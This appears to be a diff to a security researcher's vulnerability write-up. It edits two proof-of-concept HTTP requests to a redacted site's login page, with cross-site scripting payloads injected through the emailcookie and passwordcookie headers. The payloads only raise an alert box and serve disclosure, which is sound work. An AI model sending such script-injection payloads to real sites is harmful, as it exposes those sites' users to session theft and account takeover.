@@ -41,7 +41,7 @@ Option 1:
 GET /login.php HTTP/2
 Host: [REDACTED]
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
-Cookie: emailcookie="><script>alert('reigz')</script>
+Cookie: emailcookie="><script>alert('xss via emailcookie by reigz')</script>
 ```
 ![emailcookie](https://github.com/smurf-reigz/security/assets/48426940/c37efe3d-daca-4635-8202-c972795359b9)
 
@@ -50,7 +50,7 @@ Option 2:
 GET /login.php HTTP/2
 Host: [REDACTED]
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
-Cookie: passwordcookie="><script>alert('reigz')</script>
+Cookie: passwordcookie="><script>alert('xss via passwordcookie by reigz')</script>
 ```
 ![passwordcookie](https://github.com/smurf-reigz/security/assets/48426940/2043088d-1ef0-466a-b684-06f26e6b70a5)
 
